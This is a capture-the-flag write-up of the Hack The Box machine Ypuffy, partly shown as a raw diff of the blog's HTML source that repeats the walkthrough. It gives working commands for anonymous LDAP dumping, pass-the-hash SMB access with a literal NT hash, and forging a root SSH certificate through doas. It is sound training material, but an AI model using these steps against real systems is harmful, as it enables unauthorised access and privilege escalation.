puttygen : puttygen my_private_key.ppk -O private-openssh -o alice.key Now let’s take a look at the key : Last step is to chmod 600 alice.key and finally ssh ssh -i alice.key alice1978@ypuffy.htb And we owned user ! More Enumeration Remember http ? we got a connection reset. Let’s check /etc/httpd.conf We see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot; After some more enumeration , there are 3 users on the box alice1978 , bob8791 and userca bob8791 has a directory called dba Inside it there’s an sql file called sshauth.sql It creates a table called principals and another table called keys If we also check sshd_config in /etc/ssh/ # $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don&#39;t trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don&#39;t read the user&#39;s ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no # Change to no to disable s/key passwords ChallengeResponseAuthentication no AllowAgentForwarding no AllowTcpForwarding no #GatewayPorts no X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server This part : So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;username= and principals from /sshauth?type=principals&amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00r Generating and signing ssh keys , Getting root So now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them. The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it : We can run ssh-keygen as userca without password. First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsa Then we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as root doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub -s for certificate , -I for identity and -n for principal Finally we will ssh as root : ssh -i /tmp/id_rsa root@localhost And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Dab Next Hack The Box write-up : Hack The Box - Giddy","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/ypuffy/","image":"http://localhost:4000/hackthebox/ypuffy/0.png","headline":"Hack The Box - Ypuffy","dateModified":"2019-02-09T00:00:00+02:00","datePublished":"2019-02-09T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/ypuffy/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for Ypuffy from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/ypuffy/","image":"http://localhost:4000/hackthebox/ypuffy/0.png","headline":"Hack The Box - Ypuffy","dateModified":"2019-02-09T00:00:00+02:00","datePublished":"2019-02-09T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/ypuffy/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,78 +32,80 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Ypuffy</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/BSD/';">BSD</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/ldap/';">ldap</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-02-09T00:00:00+02:00" itemprop="datePublished">Feb 9, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Ypuffy</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/bsd/">bsd</a>
+      
+      <a class="tag" href="/tag/ldap/">ldap</a>
+      
+      <a class="tag" href="/tag/ssh/">ssh</a>
+      
+      <a class="tag" href="/tag/networking/">networking</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 09 Feb 2019</div>
+  
+  <div class="post-description">My write-up for Ypuffy from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-ypuffy-retired-and-this-is-my-write-up-this-box-is-a-little-different-from-the-other-boxes-its-not-windows-or-linux--its-running-openbsd-which-is-a-unix-like-system-i-really-liked-the-privilege-escalation-in-this-box-because-it-had-some-cool-ssh-stuff-without-talking-too-much-lets-jump-right-in-its-a-medium-difficulty-box-and-its-ip-is-101010107--i-added-it-in-etchosts-as-ypuffyhtb">Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ypuffy.htb</code></h4>
-<p><img src="/images/hackthebox/ypuffy/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-so-">As always we will start with nmap so :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC ypuffy.htb</code>
-<img src="/images/hackthebox/ypuffy/1.png" alt="" /></p>
-<h4 id="nmap-tells-us-that-theres-ssh-running-on-port-22--http-on-port-80--smb-on-port-139-and-445--ldap-on-port-389">Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389</h4>
-<h4 id="it-also-tells-us-that-we-can-connect-anonymously-to-ldap">It also tells us that we can connect anonymously to ldap.</h4>
-<p><br /></p>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap so :
+<code class="highlighter-rouge">nmap -sV -sT -sC ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/1.png" alt="" />
+<br /> Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389
+<br /> It also tells us that we can connect anonymously to ldap.
+<br /></p>
 <hr />
 
-<h3 id="initial-enumeration">Initial Enumeration</h3>
-<h4 id="lets-check-http-first">Let’s check http first</h4>
-<p><img src="/images/hackthebox/ypuffy/2.png" alt="" /></p>
-<h4 id="connection-reset-http-will-be-useful-later-but-not-now">Connection reset. http will be useful later but not now.</h4>
-<h4 id="moving-on-to-the-next-thing--we-have-smb-lets-see-if-we-can-do-a-null-authentication-and-enumerate-the-shares-we-will-use-smbmap">Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use <code class="highlighter-rouge">smbmap</code></h4>
-<p><code class="highlighter-rouge">smbmap -H ypuffy.htb</code>
-<img src="/images/hackthebox/ypuffy/3.png" alt="" /></p>
-<h4 id="access-denied">Access Denied.</h4>
-<h4 id="lets-check-ldap">Let’s check ldap</h4>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<p><br /> Let’s check http first 
+<img src="/images/hackthebox/ypuffy/2.png" alt="" />
+<br /> Connection reset. http will be useful later but not now.
+<br /> Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use <code class="highlighter-rouge">smbmap</code>
+<code class="highlighter-rouge">smbmap -H ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/3.png" alt="" />
+<br /> Access Denied.
+<br /> Let’s check ldap</p>
 <hr />
 
-<h3 id="ldap">LDAP</h3>
-<h4 id="nmap-told-us-that-anonymous-authentication-was-allowed-so-we-will-use-a-tool-called-ldapsearch">nmap told us that anonymous authentication was allowed so we will use a tool called <code class="highlighter-rouge">ldapsearch</code></h4>
-<p><code class="highlighter-rouge">ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</code></p>
-<h4 id="full-output-">Full Output :</h4>
+<h2 id="ldap">LDAP</h2>
+<p><br /> nmap told us that anonymous authentication was allowed so we will use a tool called <code class="highlighter-rouge">ldapsearch</code> 
+<code class="highlighter-rouge">ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb</code>
+<br /> Full Output :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># extended LDIF
 #
 # LDAPv3
@@ -206,9 +209,9 @@ result: 0 Success
 # numResponses: 9
 # numEntries: 8
 </code></pre></div></div>
-<h4 id="we-can-also-use-nmap-to-enumerate-ldap--with-a-script-called-ldap-search">we can also use nmap to enumerate ldap , with a script called <code class="highlighter-rouge">ldap-search</code></h4>
-<p><code class="highlighter-rouge">nmap -p 389 --script ldap-search ypuffy.htb</code></p>
-<h4 id="full-output">Full Output:</h4>
+<p><br /> we can also use nmap to enumerate ldap , with a script called <code class="highlighter-rouge">ldap-search</code>
+<code class="highlighter-rouge">nmap -p 389 --script ldap-search ypuffy.htb</code>
+<br /> Full Output:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET
 Nmap scan report for ypuffy.htb (10.10.10.107)
 Host is up (0.14s latency).
@@ -292,60 +295,60 @@ PORT    STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
 </code></pre></div></div>
-<h4 id="the-most-interesting-part-is-this-">The most interesting part is this :</h4>
-<p><img src="/images/hackthebox/ypuffy/4.png" alt="" /></p>
-<h4 id="we-get-a-username-alice1978-and-an-smb-nt-hash-0b186e661bbdbdcf6047784de8b9fd8b">We get a username <code class="highlighter-rouge">alice1978</code> and an smb NT hash <code class="highlighter-rouge">0B186E661BBDBDCF6047784DE8B9FD8B</code></h4>
-<h4 id="this-hash-is-uncrackable-however-we-can-still-use-it-to-authenticate">This hash is uncrackable however we can still use it to authenticate.</h4>
-<p><br /></p>
+<p><br /> The most interesting part is this :
+<img src="/images/hackthebox/ypuffy/4.png" alt="" />
+<br /> We get a username <code class="highlighter-rouge">alice1978</code> and an smb NT hash <code class="highlighter-rouge">0B186E661BBDBDCF6047784DE8B9FD8B</code>
+<br /> This hash is uncrackable however we can still use it to authenticate.
+<br /></p>
 <hr />
 
-<h3 id="smb-enumeration">SMB Enumeration</h3>
-<h4 id="we-need-to-list-the-shares-first-to-know-where-we-can-connect-we-can-use-a-tool-called-crackmapexec-">We need to list the shares first to know where we can connect. We can use a tool called <code class="highlighter-rouge">crackmapexec</code> :</h4>
-<p><code class="highlighter-rouge">crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares</code>
-<img src="/images/hackthebox/ypuffy/5.png" alt="" /></p>
-<h4 id="there-are-only-two-shares-alice-and-ipc--we-have-read-and-write-permissions-to-alice-and-no-access-to-ipc">There are only two shares <code class="highlighter-rouge">alice</code> and <code class="highlighter-rouge">IPC$</code> , we have read and write permissions to <code class="highlighter-rouge">alice</code> and no access to <code class="highlighter-rouge">IPC$</code></h4>
-<h4 id="we-can-also-use-smbclient-to-list-the-shares-">We can also use smbclient to list the shares :</h4>
-<p><code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/</code>
-<img src="/images/hackthebox/ypuffy/6.png" alt="" /></p>
-<h4 id="but-it-doesnt-tell-us-which-shares-do-we-have-access-to-and-which-we-dont">But it doesn’t tell us which shares do we have access to and which we don’t.</h4>
-<h4 id="so-we-know-that-we-can-access-the-share-alice--lets-connect">So we know that we can access the share <code class="highlighter-rouge">alice</code> , let’s connect.</h4>
-<p><code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code>
-<img src="/images/hackthebox/ypuffy/7.png" alt="" /></p>
-<h4 id="theres-only-one-file-called-my_private_keyppk--get-my_private_keyppk-to-download-it">There’s only one file called <code class="highlighter-rouge">my_private_key.ppk</code> , <code class="highlighter-rouge">get my_private_key.ppk</code> to download it.</h4>
-<p><br /></p>
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<p><br /> We need to list the shares first to know where we can connect. We can use a tool called <code class="highlighter-rouge">crackmapexec</code> :
+<code class="highlighter-rouge">crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares</code>
+<img src="/images/hackthebox/ypuffy/5.png" alt="" />
+<br /> There are only two shares <code class="highlighter-rouge">alice</code> and <code class="highlighter-rouge">IPC$</code> , we have read and write permissions to <code class="highlighter-rouge">alice</code> and no access to <code class="highlighter-rouge">IPC$</code>
+<br /> We can also use smbclient to list the shares :
+<code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/</code>
+<img src="/images/hackthebox/ypuffy/6.png" alt="" />
+<br /> But it doesn’t tell us which shares do we have access to and which we don’t.
+<br /> So we know that we can access the share <code class="highlighter-rouge">alice</code> , let’s connect.
+<code class="highlighter-rouge">smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice</code>
+<img src="/images/hackthebox/ypuffy/7.png" alt="" />
+<br /> There’s only one file called <code class="highlighter-rouge">my_private_key.ppk</code> , <code class="highlighter-rouge">get my_private_key.ppk</code> to download it.
+<br /></p>
 <hr />
 
-<h3 id="ssh-and-getting-user">SSH and getting user</h3>
-<h4 id="my_private_keyppk-is-a-putty-private-key--we-need-to-convert-that-to-an-ssh-private-key-to-be-able-to-ssh-with-it"><code class="highlighter-rouge">my_private_key.ppk</code> is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.</h4>
-<h4 id="on-kali-i-had-to-get-putty-tools-first">On kali I had to get <code class="highlighter-rouge">putty-tools</code> first</h4>
-<p><code class="highlighter-rouge">apt-get install putty-tools</code></p>
-<h4 id="then-we-will-use-puttygen-">Then we will use <code class="highlighter-rouge">puttygen</code> :</h4>
-<p><code class="highlighter-rouge">puttygen my_private_key.ppk -O private-openssh -o alice.key</code></p>
-<h4 id="now-lets-take-a-look-at-the-key-">Now let’s take a look at the key :</h4>
-<p><img src="/images/hackthebox/ypuffy/8.png" alt="" /></p>
-<h4 id="last-step-is-to-chmod-600-alicekey-and-finally-ssh">Last step is to <code class="highlighter-rouge">chmod 600 alice.key</code> and finally ssh</h4>
-<p><code class="highlighter-rouge">ssh -i alice.key alice1978@ypuffy.htb</code>
-<img src="/images/hackthebox/ypuffy/9.png" alt="" /></p>
-<h4 id="and-we-owned-user-">And we owned user !</h4>
-<p><br /></p>
+<h2 id="ssh-and-getting-user">SSH and getting user</h2>
+<p><br /> <code class="highlighter-rouge">my_private_key.ppk</code> is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. 
+<br /> On kali I had to get <code class="highlighter-rouge">putty-tools</code> first 
+<code class="highlighter-rouge">apt-get install putty-tools</code>
+<br /> Then we will use <code class="highlighter-rouge">puttygen</code> :
+<code class="highlighter-rouge">puttygen my_private_key.ppk -O private-openssh -o alice.key</code>
+<br /> Now let’s take a look at the key :
+<img src="/images/hackthebox/ypuffy/8.png" alt="" />
+<br /> Last step is to <code class="highlighter-rouge">chmod 600 alice.key</code> and finally ssh
+<code class="highlighter-rouge">ssh -i alice.key alice1978@ypuffy.htb</code>
+<img src="/images/hackthebox/ypuffy/9.png" alt="" />
+<br /> And we owned user !
+<br /></p>
 <hr />
 
-<h3 id="more-enumeration">More Enumeration</h3>
-<h4 id="remember-http--we-got-a-connection-reset-lets-check-etchttpdconf">Remember http ? we got a connection reset. Let’s check <code class="highlighter-rouge">/etc/httpd.conf</code></h4>
-<p><img src="/images/hackthebox/ypuffy/10.png" alt="" /></p>
-<h4 id="we-see-two-interesting-things--location-userca-and-location-sshauth">We see two interesting things , <code class="highlighter-rouge">location "/userca*"</code> and <code class="highlighter-rouge">location "/sshauth*"</code></h4>
-<h4 id="after-some-more-enumeration--there-are-3-users-on-the-box">After some more enumeration , there are 3 users on the box</h4>
-<p><img src="/images/hackthebox/ypuffy/11.png" alt="" /></p>
-<h4 id="alice1978--bob8791-and-userca"><code class="highlighter-rouge">alice1978</code> , <code class="highlighter-rouge">bob8791</code> and <code class="highlighter-rouge">userca</code></h4>
-<h4 id="bob8791-has-a-directory-called-dba">bob8791 has a directory called <code class="highlighter-rouge">dba</code></h4>
-<p><img src="/images/hackthebox/ypuffy/12.png" alt="" /></p>
-<h4 id="inside-it-theres-an-sql-file-called-sshauthsql">Inside it there’s an sql file called <code class="highlighter-rouge">sshauth.sql</code></h4>
-<p><img src="/images/hackthebox/ypuffy/13.png" alt="" />
+<h2 id="more-enumeration">More Enumeration</h2>
+<p><br /> Remember http ? we got a connection reset. Let’s check <code class="highlighter-rouge">/etc/httpd.conf</code>
+<img src="/images/hackthebox/ypuffy/10.png" alt="" />
+<br /> We see two interesting things , <code class="highlighter-rouge">location "/userca*"</code> and <code class="highlighter-rouge">location "/sshauth*"</code>
+<br /> After some more enumeration , there are 3 users on the box 
+<img src="/images/hackthebox/ypuffy/11.png" alt="" />
+<br /> <code class="highlighter-rouge">alice1978</code> , <code class="highlighter-rouge">bob8791</code> and <code class="highlighter-rouge">userca</code>
+<br /> bob8791 has a directory called <code class="highlighter-rouge">dba</code>
+<img src="/images/hackthebox/ypuffy/12.png" alt="" />
+<br /> Inside it there’s an sql file called <code class="highlighter-rouge">sshauth.sql</code>
+<img src="/images/hackthebox/ypuffy/13.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/ypuffy/14.png" alt="" /></p>
-<h4 id="it-creates-a-table-called-principals-and-another-table-called-keys">It creates a table called <code class="highlighter-rouge">principals</code> and another table called <code class="highlighter-rouge">keys</code></h4>
-<h4 id="if-we-also-check-sshd_config-in-etcssh">If we also check <code class="highlighter-rouge">sshd_config</code> in <code class="highlighter-rouge">/etc/ssh/</code></h4>
+<img src="/images/hackthebox/ypuffy/14.png" alt="" />
+<br /> It creates a table called <code class="highlighter-rouge">principals</code> and another table called <code class="highlighter-rouge">keys</code>
+<br /> If we also check <code class="highlighter-rouge">sshd_config</code> in <code class="highlighter-rouge">/etc/ssh/</code></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $
 
 # This is the sshd server system-wide configuration file.  See
@@ -446,75 +449,172 @@ Subsystem	sftp	/usr/libexec/sftp-server
 #	ForceCommand cvs server
 
 </code></pre></div></div>
-<h4 id="this-part-">This part :</h4>
-<p><img src="/images/hackthebox/ypuffy/15.png" alt="" /></p>
-<h4 id="so-that-http-service-is-responsible-for-some-ssh-authentication-stuff--and-we-can-request-keys-from-sshauthtypekeysusername-and-principals-from-sshauthtypeprincipalsusername--requesting-keys-for-root-gives-us-no-response--but-requesting-the-principal-we-get-3m3rgencyb4ckd00r">So that http service is responsible for some ssh authentication stuff , and we can request keys from <code class="highlighter-rouge">/sshauth?type=keys&amp;username=</code> and principals from <code class="highlighter-rouge">/sshauth?type=principals&amp;username=</code> , requesting keys for root gives us no response , but requesting the principal we get <code class="highlighter-rouge">3m3rgencyB4ckd00r</code></h4>
-<p><img src="/images/hackthebox/ypuffy/16.png" alt="" /></p>
+<p><br /> This part :
+<img src="/images/hackthebox/ypuffy/15.png" alt="" />
+<br /> So that http service is responsible for some ssh authentication stuff , and we can request keys from <code class="highlighter-rouge">/sshauth?type=keys&amp;username=</code> and principals from <code class="highlighter-rouge">/sshauth?type=principals&amp;username=</code> , requesting keys for root gives us no response , but requesting the principal we get <code class="highlighter-rouge">3m3rgencyB4ckd00r</code>
+<img src="/images/hackthebox/ypuffy/16.png" alt="" /></p>
 <hr />
 
-<h3 id="generating-and-signing-ssh-keys--getting-root">Generating and signing ssh keys , Getting root</h3>
-<h4 id="so-now-we-have-roots-principal-3m3rgencyb4ckd00r-theoretically-we-can-generate-ssh-keys-and-sign-them-with-roots-principal--and-we-will-be-able-to-ssh-as-root-with-them">So now we have root’s principal <code class="highlighter-rouge">3m3rgencyB4ckd00r</code>. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.</h4>
-<h4 id="the-problem-is--as-alice1978-we-are-not-authorized-to-do-this-on-linux-we-could-check-if-we-can-run-elevated-commands-with-sudo--l-but-here-theres-no-sudo--instead-of-that-theres-a-command-called-doas--if-we-check-the-config-file-for-it-">The problem is , as <code class="highlighter-rouge">alice1978</code> we are not authorized to do this. On linux we could check if we can run elevated commands with <code class="highlighter-rouge">sudo -l</code> but here there’s no sudo , instead of that there’s a command called <code class="highlighter-rouge">doas</code> , if we check the config file for it :</h4>
-<p><img src="/images/hackthebox/ypuffy/17.png" alt="" /></p>
-<h4 id="we-can-run-ssh-keygen-as-userca-without-password">We can run <code class="highlighter-rouge">ssh-keygen</code> as <code class="highlighter-rouge">userca</code> without password.</h4>
-<h4 id="first-step-is-to-create-ssh-keys-for-alice1978">First step is to create ssh keys for <code class="highlighter-rouge">alice1978</code></h4>
-<p><code class="highlighter-rouge">ssh-keygen -t rsa -f /tmp/id_rsa</code>
-<img src="/images/hackthebox/ypuffy/18.png" alt="" /></p>
-<h4 id="then-we-need-the-certificate-ca-in-homeuserca-so-we-will-cd-there">Then we need the certificate (<code class="highlighter-rouge">ca</code>) in <code class="highlighter-rouge">/home/userca/</code> so we will cd there</h4>
-<p><img src="/images/hackthebox/ypuffy/19.png" alt="" /></p>
-<h4 id="and-sign-the-ssh-keys-we-have-just-created-as-root">And sign the ssh keys we have just created as root</h4>
-<p><code class="highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa</code>
+<h2 id="generating-and-signing-ssh-keys--getting-root">Generating and signing ssh keys , Getting root</h2>
+<p><br /> So now we have root’s principal <code class="highlighter-rouge">3m3rgencyB4ckd00r</code>. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.
+<br /> The problem is , as <code class="highlighter-rouge">alice1978</code> we are not authorized to do this. On linux we could check if we can run elevated commands with <code class="highlighter-rouge">sudo -l</code> but here there’s no sudo , instead of that there’s a command called <code class="highlighter-rouge">doas</code> , if we check the config file for it :
+<img src="/images/hackthebox/ypuffy/17.png" alt="" />
+<br /> We can run <code class="highlighter-rouge">ssh-keygen</code> as <code class="highlighter-rouge">userca</code> without password.
+<br /> First step is to create ssh keys for <code class="highlighter-rouge">alice1978</code> 
+<code class="highlighter-rouge">ssh-keygen -t rsa -f /tmp/id_rsa</code>
+<img src="/images/hackthebox/ypuffy/18.png" alt="" />
+<br /> Then we need the certificate (<code class="highlighter-rouge">ca</code>) in <code class="highlighter-rouge">/home/userca/</code> so we will cd there 
+<img src="/images/hackthebox/ypuffy/19.png" alt="" />
+<br /> And sign the ssh keys we have just created as root
+<code class="highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa</code>
 <br />
 <br />
 <code class="highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub</code>
-<img src="/images/hackthebox/ypuffy/20.png" alt="" /></p>
-<h4 id="-s-for-certificate---i-for-identity-and--n-for-principal"><code class="highlighter-rouge">-s</code> for certificate , <code class="highlighter-rouge">-I</code> for identity and <code class="highlighter-rouge">-n</code> for principal</h4>
-<h4 id="finally-we-will-ssh-as-root-">Finally we will ssh as root :</h4>
-<p><code class="highlighter-rouge">ssh -i /tmp/id_rsa root@localhost</code>
-<img src="/images/hackthebox/ypuffy/21.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<p><br />
-<br /></p>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
